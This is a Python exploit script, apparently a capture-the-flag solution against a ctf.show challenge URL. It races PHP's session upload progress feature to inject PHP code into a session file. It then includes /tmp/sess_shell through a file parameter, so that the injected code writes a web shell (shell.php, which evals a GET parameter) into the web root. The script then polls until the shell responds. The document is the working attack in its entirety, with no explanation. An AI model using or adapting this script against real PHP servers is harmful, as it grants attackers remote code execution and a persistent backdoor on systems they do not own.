from requests import get, post
from io import BytesIO
from threading import Thread
from urllib.parse import urljoin

URL = 'http://48838228-2f99-4a7b-84a0-a7654c5c5345.challenge.ctf.show/'
PHPSESSID = 'shell'


def write():
    code = "<?php file_put_contents('/var/www/html/shell.php', '<?php @eval($_GET[1]);?>');?>"
    data = {'PHP_SESSION_UPLOAD_PROGRESS': code}
    cookies = {'PHPSESSID': PHPSESSID}
    files = {'file': ('xxx.txt', BytesIO(b'x' * 10240))}
    while True:
        post(URL, data, cookies=cookies, files=files)


def read():
    params = {'file': f'/tmp/sess_{PHPSESSID}'}
    while True:
        get(URL, params)
        url = urljoin(URL, 'shell.php')
        code = get(url).status_code.real
        print(f'{url} {code}')
        if code == 200:
            exit()


if __name__ == '__main__':
    Thread(target=write, daemon=True).start()
    read()